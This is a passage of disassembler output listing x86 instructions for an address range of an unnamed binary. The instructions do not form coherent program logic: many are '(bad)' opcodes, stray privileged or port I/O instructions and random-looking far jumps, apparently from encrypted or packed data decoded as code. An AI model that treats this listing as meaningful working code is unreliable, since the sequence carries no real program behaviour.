  4152cd:	fist   DWORD PTR ds:0x290b8f63
  4152d3:	mov    cl,0xe
  4152d5:	pusha  
  4152d6:	or     ebp,edx
  4152d8:	fwait
  4152d9:	add    DWORD PTR [edx],eax
  4152db:	in     eax,dx
  4152dc:	enter  0x754,0x11
  4152e0:	fcmovnbe st,st(0)
  4152e2:	dec    eax
  4152e3:	or     eax,eax
  4152e5:	sbb    al,0xf3
  4152e7:	ror    BYTE PTR [ebp-0x37c33693],1
  4152ed:	inc    edi
  4152ee:	mov    WORD PTR [eax+0x2877ed45],es
  4152f4:	or     dl,BYTE PTR [ebx+edx*1-0x6d]
  4152f8:	int    0xea
  4152fa:	push   eax
  4152fb:	sbb    esp,DWORD PTR [edx]
  4152fd:	mov    dh,0x34
  4152ff:	mov    al,0xce
  415301:	cli    
  415302:	xor    BYTE PTR [esi+0x10db5b0],0xe1
  415309:	arpl   WORD PTR [esi-0x77],bp
  41530c:	iret   
  41530d:	pop    ebx
  41530e:	into   
  41530f:	xor    dl,BYTE PTR [ecx]
  415311:	jno    0x4152f5
  415313:	(bad)  
  415314:	loope  0x41536b
  415316:	repnz mov cl,0xf4
  415319:	dec    edx
  41531a:	shl    BYTE PTR [esi+0x2efc64b0],1
  415320:	popf   
  415321:	outs   dx,BYTE PTR ds:[esi]
  415322:	dec    ecx
  415323:	push   esp
  415324:	pop    ebp
  415325:	inc    ecx
  415326:	pop    esp
  415327:	fsubr  DWORD PTR [ebp-0x587795cd]
  41532d:	or     DWORD PTR [ebx],esp
  41532f:	adc    eax,0x961b0b6d
  415334:	sub    al,0x40
  415336:	sub    eax,0xc14d9014
  41533b:	lods   eax,DWORD PTR ds:[esi]
  41533c:	lods   eax,DWORD PTR ds:[esi]
  41533d:	fsincos 
  41533f:	retf   0xa931
  415342:	in     eax,dx
  415343:	or     al,0x51
  415345:	mov    ebx,0x238a3941
  41534a:	inc    esp
  41534b:	into   
  41534c:	sub    ch,BYTE PTR [eax]
  41534e:	clc    
  41534f:	ret    0x89ad
  415352:	push   0x32
  415354:	inc    ebp
  415355:	push   ecx
  415356:	add    bl,BYTE PTR [edx+edi*1+0x34]
  41535a:	pop    eax
  41535b:	fcomp  st(2)
  41535d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41535e:	inc    ecx
  41535f:	test   DWORD PTR [ebx-0x41],ecx
  415362:	sub    DWORD PTR [eax+0x55],ebx
  415365:	scas   eax,DWORD PTR es:[edi]
  415366:	mov    al,0xd0
  415368:	adc    BYTE PTR [ebp+0x2e],bl
  41536b:	push   edi
  41536c:	out    0xd,eax
  41536e:	cmp    ebp,eax
  415370:	daa    
  415371:	imul   esp,DWORD PTR [ecx+0x78c7bb7c],0xffffffba
  415378:	inc    ecx
  415379:	xchg   esp,eax
  41537a:	add    ch,bl
  41537c:	cmp    BYTE PTR [edx+0x15],ch
  41537f:	or     dh,BYTE PTR [esi-0x148f5273]
  415385:	mov    ah,BYTE PTR [esi+0x2030d077]
  41538b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41538c:	ficom  DWORD PTR [ecx]
  41538e:	jge    0x4153ec
  415390:	fidivr DWORD PTR [edx+0x55]
  415393:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415394:	(bad)  
  415395:	retf   0x5172
  415398:	inc    ecx
  415399:	fstp   QWORD PTR [eax+0x28]
  41539c:	mov    ch,0x85
  41539e:	mov    dl,0x36
  4153a0:	adc    DWORD PTR [edx+ebx*8],edi
  4153a3:	ucomiss xmm2,xmm0
  4153a6:	adc    DWORD PTR [eax],ebx
  4153a8:	inc    edx
  4153a9:	ds mov ebp,0xd73f74e9
  4153af:	stc    
  4153b0:	ret    0xddad
  4153b3:	cwde   
  4153b4:	pop    ebx
  4153b5:	(bad)  
  4153b6:	and    BYTE PTR [ecx+0x1d],al
  4153b9:	es (bad) 
  4153bb:	pop    ss
  4153bc:	add    BYTE PTR [ecx],bl
  4153be:	push   edx
  4153bf:	pop    eax
  4153c0:	fisubr WORD PTR [esi+0x6d]
  4153c3:	fwait
  4153c4:	inc    edi
  4153c5:	xlat   BYTE PTR ds:[ebx]
  4153c6:	mov    bh,0xe9
  4153c8:	sahf   
  4153c9:	add    DWORD PTR [eax],0xb689c0ee
  4153cf:	pop    ebp
  4153d0:	fmul   DWORD PTR [ecx]
  4153d2:	cmp    eax,0x92bf161f
  4153d7:	and    dh,BYTE PTR [esi+0x7b7051d3]
  4153dd:	mov    ds:0x11cbeec0,al
  4153e2:	xor    eax,0x2e16d14d
  4153e7:	xor    eax,0x871702e5
  4153ec:	enter  0x45b8,0xce
  4153f0:	(bad)  [esi-0x20034f50]
  4153f6:	cli    
  4153f7:	test   DWORD PTR es:[edi+ebp*8-0x3efde51c],esp
  4153ff:	push   es
  415400:	adc    al,0x85
  415402:	xor    BYTE PTR [edi],dh
  415404:	pop    ecx
  415405:	lea    edx,cs:[edx]
  415408:	push   eax
  415409:	adc    ebx,esi
  41540b:	lods   eax,DWORD PTR ds:[esi]
  41540c:	or     al,0xe1
  41540e:	arpl   WORD PTR [ebx+0x11],ax
  415411:	retf   
  415412:	push   cs
  415413:	push   cs
  415414:	inc    ebp
  415415:	dec    ecx
  415416:	sahf   
  415417:	and    DWORD PTR [ecx],0x1
  41541a:	mov    BYTE PTR [esi+0x6e6a826a],cl
  415420:	inc    esi
  415421:	jbe    0x41544e
  415423:	push   ebp
  415424:	imul   edx,eax,0xffffff9d
  415427:	es gs iret 
  41542a:	sub    al,0xcb
  41542c:	pop    ebx
  41542d:	sbb    eax,0xecdbdb51
  415432:	popf   
  415433:	sub    DWORD PTR [eax-0x7f7296c3],edi
  415439:	mov    fs,WORD PTR [eax+0x68bd878e]
  41543f:	mov    eax,ds:0xd7b5b540
  415444:	mov    edi,0x2b747989
  415449:	retf   
  41544a:	mov    dl,0x76
  41544d:	int3   
  41544e:	fiadd  WORD PTR [eax+0x2a8c9196]
  415454:	(bad)  
  415455:	loope  0x41540c
  415457:	mov    al,0xd4
  415459:	inc    ecx
  41545a:	push   ebp
  41545b:	(bad)
  41545e:	test   eax,0xdb8a3ae3
  415463:	mov    dh,0x9d
  415465:	xor    ebx,DWORD PTR [eax-0x58fab267]
  41546b:	mov    dh,0xcc
  41546d:	mov    al,0xd0
  41546f:	push   esp
  415470:	add    BYTE PTR [ecx],ah
  415472:	in     al,dx
  415473:	or     BYTE PTR [ecx+eiz*4+0x51db46e5],ch
  41547a:	stc    
  41547b:	adc    BYTE PTR [ebx],cl
  41547d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41547e:	div    BYTE PTR [esi-0x65e92510]
  415484:	and    BYTE PTR [edx+0x70],0xc1
  415488:	or     eax,0x8d805f83
  41548d:	xchg   BYTE PTR [edx-0x27740fb],al
  415493:	adc    DWORD PTR [ecx+eax*1],esp
  415496:	ins    BYTE PTR es:[edi],dx
  415497:	mov    ah,0xf2
  415499:	fist   WORD PTR [eax+eax*1]
  41549c:	xor    DWORD PTR [esi+0x3],0x5b6c0bb6
  4154a3:	or     eax,0x50400aef
  4154a8:	(bad)  
  4154a9:	dec    ebx
  4154aa:	sbb    BYTE PTR [edx],ah
  4154ac:	and    eax,0xbc8283a8
  4154b1:	gs cld 
  4154b3:	add    ecx,DWORD PTR [ebx]
  4154b5:	mov    bh,0xe
  4154b7:	stos   BYTE PTR es:[edi],al
  4154b8:	push   edi
  4154b9:	sub    ebp,DWORD PTR [eax-0x65155723]
  4154bf:	add    DWORD PTR [ebx+0x506816b6],eax
  4154c5:	xchg   esi,eax
  4154c6:	in     al,dx
  4154c7:	pop    ebx
  4154c8:	dec    ebp
  4154c9:	fild   QWORD PTR [esi]
  4154cb:	sub    BYTE PTR [ebp+0x6b],0xf1
  4154cf:	test   eax,0xddd526b2
  4154d4:	ss inc ecx
  4154d6:	(bad)  
  4154d8:	or     ebx,DWORD PTR [esi-0x59]
  4154db:	cmp    esp,0x26
  4154de:	(bad)  
  4154df:	push   ss
  4154e0:	stc    
  4154e1:	jne    0x415524
  4154e3:	ins    DWORD PTR es:[edi],dx
  4154e4:	mov    BYTE PTR ds:0x3816bffe,cl
  4154ea:	(bad)  [esi+0x42652e3e]
  4154f0:	xor    BYTE PTR [edi+0x6b9a49a6],bl
  4154f6:	cmp    BYTE PTR [edx],bl
  4154f8:	push   cs
  4154f9:	fcomp  QWORD PTR [edx+0x62]
  4154fc:	mov    esp,0x9bd30d94
  415501:	sub    eax,0x5c510df3
  415506:	add    ah,ch
  415508:	ins    BYTE PTR es:[edi],dx
  415509:	sbb    eax,0xb6eafc3b
  41550e:	mov    ch,0x1b
  415510:	imul   dl
  415512:	xchg   esp,eax
  415513:	das    
  415514:	mov    eax,ds:0xcf87ec6c
  415519:	fcomp  st(2)
  41551b:	lods   eax,DWORD PTR ds:[esi]
  41551c:	stos   DWORD PTR es:[edi],eax
  41551d:	rcl    DWORD PTR [eax+0x2],cl
  415520:	lahf   
  415521:	lds    eax,FWORD PTR [edi-0x59]
  415524:	pop    edi
  415525:	xor    dl,BYTE PTR [eax]
  415527:	aaa    
  415528:	xchg   esi,eax
  415529:	and    eax,0x6813cce9
  41552e:	add    al,0x68
  415530:	mov    bh,0x8d
  415532:	lods   eax,DWORD PTR ds:[esi]
  415533:	pop    es
  415534:	cmp    edx,DWORD PTR [eax-0x6e5b8568]
  41553a:	rcr    DWORD PTR [ebx+0x6d],1
  41553d:	sub    ebx,DWORD PTR [edx+0x4f]
  415540:	loopne 0x415567
  415542:	(bad)  
  415543:	mov    edx,edi
  415545:	mov    ebp,0x1b2c06b7
  41554a:	dec    ebx
  41554b:	lods   al,BYTE PTR ds:[esi]
  41554c:	xchg   ebp,eax
  41554d:	xor    eax,DWORD PTR [ecx+0xa]
  415550:	rcr    BYTE PTR [edx-0x25],1
  415553:	push   esp
  415554:	ins    DWORD PTR es:[edi],dx
  415555:	rcl    esp,1
  415557:	jle    0x4154fa
  415559:	inc    ecx
  41555a:	push   ebx
  41555b:	push   cs
  41555c:	(bad)  
  41555d:	inc    ebp
  41555e:	mov    cl,0x15
  415560:	mov    esp,0x7658e156
  415565:	and    bl,bl
  415567:	(bad)  
  415568:	rcl    dl,cl
  41556a:	mov    bl,BYTE PTR [edi+0x47]
  41556d:	xchg   BYTE PTR [eax],bl
  41556f:	lahf   
  415570:	es push ebx
  415572:	push   0x76
  415574:	and    DWORD PTR [esi],0xffffff80
  415577:	xchg   BYTE PTR [ebx+edi*2-0x6b],dh
  41557b:	jge    0x4154fe
  41557d:	pop    ecx
  41557e:	push   esp
  41557f:	fst    QWORD PTR [esi]
  415581:	fisub  DWORD PTR [edi+eax*2+0x4c]
  415585:	in     al,0x20
  415587:	idiv   DWORD PTR [esi-0x60]
  41558a:	loopne 0x415542
  41558c:	jne    0x41558d
  41558e:	dec    ecx
  41558f:	sub    al,0xf3
  415591:	add    bl,BYTE PTR [ebx+0xd]
  415594:	lea    ebp,[ebp+0x61]
  415597:	imul   ebx,esi,0x50
  41559a:	jecxz  0x41553a
  41559c:	jo     0x41559d
  41559e:	out    dx,eax
  41559f:	cmp    BYTE PTR ds:0x85dadd57,dl
  4155a5:	jno    0x4155f0
  4155a7:	jg     0x4155ad
  4155a9:	add    eax,0x67e9c971
  4155ae:	fimul  DWORD PTR [esi]
  4155b0:	test   al,0x5b
  4155b2:	outs   dx,DWORD PTR ds:[esi]
  4155b3:	or     dl,dl
  4155b5:	scas   eax,DWORD PTR es:[edi]
  4155b6:	dec    esi
  4155b7:	fnsavew es:[eax-0x2dc95f4b]
  4155bf:	sbb    dh,BYTE PTR [eax+0x47]
  4155c2:	or     eax,0xba0edadc
  4155c7:	(bad)  
  4155c8:	(bad)  
  4155ca:	or     eax,0x2fe9abc5
  4155cf:	jne    0x4155f2
  4155d1:	inc    ebp
  4155d2:	mov    bh,0xb6
  4155d4:	sub    eax,0x3fece5b
  4155d9:	out    dx,eax
  4155da:	xchg   ebp,eax
  4155db:	xchg   ecx,eax
  4155dc:	gs ins DWORD PTR es:[edi],dx
  4155de:	imul   ecx,DWORD PTR [eax+0x2680184d],0xfffffff3
  4155e5:	push   0x582c93cb
  4155ea:	fadd   DWORD PTR [eax]
  4155ec:	shr    BYTE PTR [eax],1
  4155ee:	adc    DWORD PTR [ebx],edi
  4155f0:	rcl    DWORD PTR ds:0x6c5036ee,cl
  4155f6:	mov    BYTE PTR [eax-0x39],bl
  4155f9:	dec    edi
  4155fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155fb:	cld    
  4155fc:	mov    edi,0x320b696d
  415601:	retf   0x98e0
  415604:	jno    0x41558b
  415606:	lds    esp,FWORD PTR [esi]
  415608:	sub    BYTE PTR ds:0x9640f980,0x50
  41560f:	ss push ecx
  415611:	fisttp DWORD PTR [ebp-0x19ce136]
  415617:	mov    ecx,0x10d7a938
  41561c:	shl    DWORD PTR [esi-0x4ac1d713],1
  415622:	int3   
  415623:	jecxz  0x41569a
  415625:	sbb    eax,0x8801b4bb
  41562a:	pop    ebp
  41562b:	inc    esi
  41562c:	fistp  WORD PTR [edi-0x71abab60]
  415632:	loopne 0x41560a
  415634:	inc    ebp
  415635:	lahf   
  415636:	clc    
  415637:	in     al,dx
  415638:	push   ebp
  415639:	xchg   edi,eax
  41563a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41563b:	push   edx
  41563c:	or     eax,0x47ebdb05
  415641:	mov    WORD PTR [ecx+0x2b],fs
  415644:	or     eax,0xb42c11ff
  415649:	(bad)  
  41564a:	xor    eax,ebx
  41564c:	addr16 sbb eax,ecx
  41564f:	adc    eax,0xfdd042b7
  415654:	(bad)
  415659:	mov    dh,0xe
  41565b:	or     BYTE PTR [esi+0x45],dh
  41565e:	jmp    0x3c129116
  415663:	xor    ch,BYTE PTR [esi]
  415665:	je     0x4156bc
  415667:	(bad)  [esi-0x7f]
  41566a:	inc    ebp
  41566b:	mov    al,al
  41566d:	inc    ebx
  41566e:	int    0x4a
  415670:	lods   eax,DWORD PTR ds:[esi]
  415671:	sbb    edx,0xbcdf5a36
  415677:	std    
  415678:	or     DWORD PTR [ebp+0x6e],ebx
  41567b:	push   ss
  41567c:	xchg   esi,eax
  41567d:	mov    dh,0xb6
  41567f:	loope  0x415658
  415681:	fisttp DWORD PTR [esi-0x7da4a632]
  415687:	add    al,0xc5
  415689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41568a:	dec    edx
  41568b:	mov    bh,0xa6
  41568d:	jns    0x415616
  41568f:	xchg   BYTE PTR [esi],dh
  415691:	aas    
  415692:	not    BYTE PTR [esi]
  415694:	rol    BYTE PTR cs:[esp+ecx*4-0x7f],1
  415699:	sbb    BYTE PTR [esi-0x457eaa1a],bh
  41569f:	shl    DWORD PTR [esi+0x264411d4],0x14
  4156a6:	sub    DWORD PTR [ebx-0x7e8e1ac6],esi
  4156ac:	lods   eax,DWORD PTR ds:[esi]
  4156ad:	stos   DWORD PTR es:[edi],eax
  4156ae:	sbb    al,BYTE PTR [ebx+edx*2+0x608dfcca]
  4156b5:	jo     0x415640
  4156b7:	mov    dh,0xb4
  4156b9:	sub    dl,BYTE PTR [esi+0x17]
  4156bc:	daa    
  4156bd:	into   
  4156be:	sbb    BYTE PTR [ebx],0xe0
  4156c1:	or     ebx,ebx
  4156c3:	repnz das 
  4156c5:	xor    BYTE PTR [eax+eax*1],al
  4156c8:	adc    eax,0xb1ee0049
  4156cd:	call   0x2e3b9019
  4156d2:	mov    dh,0x85
  4156d4:	jbe    0x415741
  4156d6:	xchg   BYTE PTR [esi],bh
  4156d8:	cmp    BYTE PTR [esi],dl
  4156da:	mov    bl,0x76
  4156dc:	lods   al,BYTE PTR ds:[esi]
  4156dd:	cmc    
  4156de:	(bad)  
  4156df:	mov    dh,0x35
  4156e1:	add    al,0xdd
  4156e3:	pop    ss
  4156e4:	test   eax,0xcea0b8a7
  4156e9:	add    eax,0xb4b1b5c
  4156ee:	fcomi  st,st(3)
  4156f0:	(bad)  
  4156f2:	push   ss
  4156f3:	jp     0x4156c0
  4156f5:	popf   
  4156f6:	dec    eax
  4156f7:	lds    esi,FWORD PTR [edi+0x776e2a26]
  4156fd:	scas   al,BYTE PTR es:[edi]
  4156fe:	ret    
  4156ff:	push   esi
  415700:	into   
  415701:	rcr    DWORD PTR ds:0x45361630,1
  415707:	ins    BYTE PTR es:[edi],dx
  415708:	into   
  415709:	cmp    al,0xf
  41570b:	lahf   
  41570c:	jo     0x415736
  41570e:	ins    BYTE PTR es:[edi],dx
  41570f:	fiadd  DWORD PTR [eax-0x65b8d752]
  415715:	lea    ecx,[ebp-0x7517f52a]
  41571b:	dec    ebx
  41571c:	mov    ds:0x1b6db321,al
  415721:	in     eax,dx
  415722:	sar    BYTE PTR [ebx+0x26224cdd],cl
  415728:	dec    ebx
  415729:	nop
  41572a:	je     0x4156c6
  41572c:	ss ss retf 0x7d2f
  415731:	cmp    esi,ebx
  415733:	add    ch,ah
  415735:	adc    BYTE PTR [esi-0x4a],ah
  415738:	js     0x4156e1
  41573a:	sub    BYTE PTR [esi],dh
  41573c:	sub    BYTE PTR ss:[ecx+0x1f],0xfc
  415741:	jno    0x41571e
  415743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415744:	lods   eax,DWORD PTR ds:[esi]
  415745:	mov    ds,WORD PTR [eax-0x2]
  415748:	add    edi,edi
  41574a:	bound  eax,QWORD PTR [esi]
  41574c:	test   al,0xfb
  41574e:	rol    BYTE PTR [ebp+ebx*2-0x28],0x68
  415753:	pop    ecx
  415754:	xchg   esi,eax
  415755:	push   esi
  415756:	pop    eax
  415757:	popa   
  415758:	lahf   
  415759:	shr    BYTE PTR [esi+0x7bef762a],0x85
  415760:	and    DWORD PTR [ecx+0x608bb451],ebx
  415766:	pop    ss
  415767:	rcl    DWORD PTR [ecx-0x55dd43f6],cl
  41576d:	push   edx
  41576e:	mov    ebx,0xc36311d0
  415773:	sbb    DWORD PTR [edi+edi*1],ebp
  415776:	loopne 0x4157bf
  415778:	mov    cl,0xa3
  41577a:	sbb    bl,0x28
  41577d:	jge    0x415735
  41577f:	dec    edx
  415780:	imul   DWORD PTR [esi+ecx*1]
  415783:	mov    dh,0x5a
  415785:	rcl    BYTE PTR [eax],1
  415787:	and    BYTE PTR [ecx+ecx*2+0x49],bh
  41578b:	cmp    ecx,DWORD PTR ss:[edx+0x9d128d8]
  415792:	push   ds
  415793:	(bad)  
  415794:	je     0x415736
  415796:	ins    DWORD PTR es:[edi],dx
  415797:	pop    es
  415798:	add    DWORD PTR [ebp-0x4d6bd1b],esp
  41579e:	inc    eax
  41579f:	or     eax,0x2b8ec45
  4157a4:	aam    0x37
  4157a6:	jle    0x415763
  4157a8:	test   al,0xa9
  4157aa:	mov    dh,0xb9
  4157ac:	outs   dx,BYTE PTR ds:[esi]
  4157ad:	jge    0x41580f
  4157af:	sti    
  4157b0:	sbb    DWORD PTR [ecx],0xffffff93
  4157b3:	jne    0x4157ca
  4157b5:	mov    cl,0x6d
  4157b7:	or     BYTE PTR [esi],ah
  4157b9:	clc    
  4157ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157bb:	hlt    
  4157bc:	retf   0xb506
  4157bf:	mov    al,0x6d
  4157c1:	call   0x16706f7a
  4157c6:	neg    DWORD PTR [ecx-0x4a]
  4157c9:	sub    eax,0x2844b6dc
  4157ce:	fnstsw WORD PTR [ecx]
  4157d0:	mov    eax,0x3708ded6
  4157d5:	(bad)  
  4157d7:	aad    0xad
  4157d9:	(bad)  
  4157da:	sbb    ah,bh
  4157dc:	add    edx,ebp
  4157de:	cli    
  4157df:	enter  0x2cb8,0x8d
  4157e3:	test   DWORD PTR [esi],ecx
  4157e5:	sub    BYTE PTR [esi+0x41],cl
  4157e8:	scas   eax,DWORD PTR es:[edi]
  4157e9:	xlat   BYTE PTR ds:[ebx]
  4157ea:	jb     0x4157a0
  4157ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157ed:	add    dh,0xf5
  4157f0:	in     eax,dx
  4157f1:	mov    bh,0xfb
  4157f3:	push   edx
  4157f4:	inc    ecx
  4157f5:	imul   eax,DWORD PTR [ebp+ebp*1+0x2c],0xffffffaf
  4157fa:	stc    
  4157fb:	addr16 fwait
  4157fd:	or     esp,DWORD PTR [ebp+0x0]
  415800:	push   0xffffffad
  415802:	push   0x11
  415804:	shr    esp,1
  415806:	cmp    eax,DWORD PTR [eax+0x13c7260b]
  41580c:	mov    bl,0x23
  41580e:	fst    st(2)
  415810:	lds    eax,FWORD PTR [edi+0x55]
  415813:	ret    
  415814:	pop    es
  415815:	xchg   ebp,eax
  415816:	fstp   QWORD PTR [esi-0x70]
  415819:	sub    eax,0x46ed6c2e
  41581e:	lahf   
  41581f:	int3   
  415820:	push   ecx
  415821:	mov    ds:0x49b69202,eax
  415826:	mov    bh,0xb
  415828:	popa   
  415829:	jecxz  0x415881
  41582b:	fcomp  DWORD PTR [eax+0x1a95a959]
  415831:	inc    ebx
  415832:	sub    eax,0x6b74cbe
  415837:	mov    ch,BYTE PTR [ebp-0x7a]
  41583a:	xchg   BYTE PTR [esi],ah
  41583c:	jbe    0x415841
  41583e:	sub    DWORD PTR [ebx+0x1e],edx
  415841:	sbb    DWORD PTR [eax+0x3c9e6d1f],ecx
  415847:	fbld   TBYTE PTR [ebx]
  415849:	lods   al,BYTE PTR ds:[esi]
  41584a:	lods   al,BYTE PTR ds:[esi]
  41584b:	sbb    esp,DWORD PTR [edx]
  41584d:	cs inc ecx
  41584f:	or     DWORD PTR [edi+0x195f478d],0xffffffb6
  415856:	lea    eax,[edx+0x6b]
  415859:	aam    0xf2
  41585b:	mov    ds:0xf3aa636f,al
  415860:	mov    eax,ds:0x8cd6e22b
  415865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415866:	xchg   edx,eax
  415867:	cmc    
  415868:	stos   BYTE PTR es:[edi],al
  415869:	aas    
  41586a:	and    ch,BYTE PTR [ebx-0x49]
  41586d:	jbe    0x4158d8
  41586f:	pusha  
  415870:	sub    DWORD PTR [ecx+eiz*1+0x5d3aaad1],edx
  415877:	adc    al,0x9e
  415879:	adc    eax,0x7876ab71
  41587e:	xchg   ecx,eax
  41587f:	pop    edi
  415880:	sbb    dl,0x2f
  415883:	je     0x415828
  415885:	and    ebx,edx
  415887:	or     esi,DWORD PTR [esp+ecx*8-0x7c]
  41588b:	inc    esp
  41588c:	mov    cl,BYTE PTR [ecx-0x14]
  41588f:	mov    ch,BYTE PTR [ebp-0x25]
  415892:	add    BYTE PTR [ebx+ebx*8+0x58],al
  415896:	inc    ecx
  415897:	xor    al,0x50
  415899:	xchg   DWORD PTR [ebp+0x4],ecx
  41589c:	fild   DWORD PTR [esi]
  41589e:	and    ah,BYTE PTR [edx]
  4158a0:	xchg   esi,eax
  4158a1:	or     DWORD PTR [edx],0xffffffb7
  4158a4:	sub    al,0x40
  4158a6:	pop    ebx
  4158a7:	mov    ebx,0x748f236d
  4158ac:	mov    esi,0x328c4760
  4158b1:	mov    dh,0xbc
  4158b3:	shr    BYTE PTR [ebp+0x2512aa77],0x1e
  4158ba:	enter  0xff00,0x43
  4158be:	mov    al,0x17
  4158c0:	shl    BYTE PTR [esi],1
  4158c2:	jmp    0xc50e:0xdb55f708
  4158c9:	pop    ebp
  4158ca:	add    al,0xb7
  4158cc:	add    BYTE PTR [eax],dh
  4158ce:	push   ds
  4158cf:	xchg   ecx,eax
  4158d0:	jge    0x415923
  4158d2:	fstp   TBYTE PTR [edx]
  4158d4:	add    BYTE PTR [esi+0x7eda7164],dh
  4158da:	mov    ds:0x4029072f,eax
  4158df:	shr    BYTE PTR [ebp+0x63],1
  4158e2:	pop    ebx
  4158e3:	aas    
  4158e4:	sub    eax,0x4b9d3623
  4158e9:	mov    ch,0xb0
  4158eb:	xor    eax,0x1b05d229
  4158f0:	sub    bh,cl
  4158f2:	inc    ecx
  4158f3:	mov    ecx,0xa37155d
  4158f8:	call   0x8afbb648
  4158fd:	sub    BYTE PTR [esi],0x94
  415900:	outs   dx,BYTE PTR ds:[esi]
  415901:	or     ecx,DWORD PTR [ecx-0x6b]
  415904:	ds (bad) 
  415907:	mov    ecx,0x80f957ac
  41590c:	lea    ebp,[esi]
  41590e:	or     BYTE PTR [edx],bl
  415910:	shr    DWORD PTR [esi+0x5ad96dd5],cl
  415916:	aam    0x66
  415918:	pop    ecx
  415919:	push   esi
  41591a:	pop    edi
  41591b:	adc    BYTE PTR [ecx],0x6d
  41591e:	fist   DWORD PTR [esi-0x424f854a]
  415924:	and    ebx,ecx
  415926:	xchg   ebp,eax
  415927:	push   ebp
  415928:	add    ah,BYTE PTR [esi-0x8]
  41592b:	das    
  41592c:	mov    dh,0xa2
  41592e:	fiadd  DWORD PTR [ecx]
  415930:	ficomp WORD PTR [ebx+0x6d7e796f]
  415936:	popa   
  415937:	(bad)  [esi-0xa461667]
  41593d:	inc    esp
  41593e:	stos   BYTE PTR es:[edi],al
  41593f:	jle    0x415920
  415941:	cmc    
  415942:	push   cs
  415943:	test   al,0xdd
  415945:	mov    dh,0xad
  415947:	outs   dx,BYTE PTR ds:[esi]
  415948:	pop    es
  415949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41594a:	cmp    BYTE PTR [ebp+eax*1+0x4f],ch
  41594e:	xor    ch,BYTE PTR [ebp-0x257e9dda]
  415954:	add    edx,edi
  415956:	adc    DWORD PTR [eax-0x71],0xd1576162
  41595d:	shl    DWORD PTR [eax],0x8f
  415960:	mov    ds:0xdb54d07c,eax
  415965:	mov    dh,0xad
  415967:	stos   DWORD PTR es:[edi],eax
  415968:	and    DWORD PTR [edx],edi
  41596a:	xor    al,BYTE PTR [ecx+0x2c]
  41596d:	push   eax
  41596e:	je     0x415938
  415970:	dec    edx
  415971:	push   ecx
  415972:	fiadd  DWORD PTR [ecx+0x75]
  415975:	and    DWORD PTR [edx-0x6c],eax
  415978:	cmp    DWORD PTR [esi+eiz*1-0x2b],eax
  41597c:	push   esp
  41597d:	fstp   TBYTE PTR [edx+0x67673506]
  415983:	jne    0x4159d2
  415985:	lock push ds
  415987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415988:	loopne 0x415940
  41598a:	cmc    
  41598b:	cs aam 0x1
  41598e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41598f:	repnz aas 
  415991:	dec    edi
  415992:	scas   al,BYTE PTR es:[edi]
  415993:	sbb    dh,BYTE PTR [edi+0x18c08dd2]
  415999:	mov    al,0x80
  41599b:	mov    al,0xb0
  41599d:	lods   eax,DWORD PTR ds:[esi]
  41599e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41599f:	imul   esp,DWORD PTR ss:[ebx+0x63],0xffffffdb
  4159a4:	stos   BYTE PTR es:[edi],al
  4159a5:	sub    eax,0xf1c9591d
  4159aa:	mov    cl,0xce
  4159ac:	mov    dl,0xda
  4159ae:	test   DWORD PTR [ebp+0x61],ebp
  4159b1:	fucom  st(2)
  4159b3:	lds    esi,FWORD PTR [eax+0x38b20d33]
  4159b9:	jp     0x415a23
  4159bb:	sbb    ebx,DWORD PTR [ebx]
  4159bd:	aaa    
  4159be:	sub    dh,dh
  4159c0:	ja     0x41595b
  4159c2:	cdq    
  4159c3:	ins    BYTE PTR es:[edi],dx
  4159c4:	mov    esi,0x6e8a6bd1
  4159c9:	add    eax,0x637f41a6
  4159ce:	ja     0x415970
  4159d0:	push   eax
  4159d1:	xchg   esi,eax
  4159d2:	lea    esi,[esi+0x6b]
  4159d5:	fst    DWORD PTR [ebp-0x4a]
  4159d8:	mov    al,ds:0x8a2df0bc
  4159dd:	adc    edx,DWORD PTR [eax]
  4159df:	pop    ss
  4159e0:	xchg   esi,eax
  4159e1:	mov    al,0xb3
  4159e3:	inc    eax
  4159e4:	arpl   WORD PTR [edx+edx*4+0x43],bx
  4159e8:	mov    ch,0x9
  4159ea:	pusha  
  4159eb:	dec    ebx
  4159ec:	stc    
  4159ed:	into   
  4159ee:	mov    ebp,0x62ba5fa1
  4159f3:	loope  0x415a4b
  4159f5:	test   DWORD PTR [ebp+0x447f53f7],eax
  4159fb:	aas    
  4159fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4159fd:	stos   BYTE PTR es:[edi],al
  4159fe:	xor    ah,al
  415a00:	test   DWORD PTR [eax-0x3c],edx
  415a03:	push   esp
  415a04:	idiv   BYTE PTR [ebx+0x51dad8b9]
  415a0a:	in     eax,dx
  415a0b:	mov    al,ds:0x4e831284
  415a10:	mov    cl,0x32
  415a12:	or     BYTE PTR [ebx-0x7b],0x5b
  415a16:	clc    
  415a17:	inc    edi
  415a18:	dec    eax
  415a19:	xchg   esp,eax
  415a1a:	pop    ss
  415a1b:	imul   ebp,DWORD PTR [ecx-0x1b],0xffffffdf
  415a1f:	mov    al,ds:0xb9e15029
  415a24:	and    al,cl
  415a26:	add    BYTE PTR [eax],ch
  415a28:	ins    DWORD PTR es:[edi],dx
  415a29:	add    BYTE PTR [eax-0x1e],cl
  415a2c:	inc    esi
  415a2d:	push   ebx
  415a2e:	aam    0x5e
  415a30:	out    0x1,al
  415a32:	rcl    BYTE PTR [edi+0x45],1
  415a35:	jmp    0x6a37:0xa6a5805b
  415a3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a3d:	call   0x6164f2e5
  415a42:	leave  
  415a43:	push   esp
  415a44:	imul   ecx,edx,0x5b
  415a47:	or     ebp,esi
  415a49:	mov    ds:0x836aabd6,eax
  415a4e:	pusha  
  415a4f:	stos   DWORD PTR es:[edi],eax
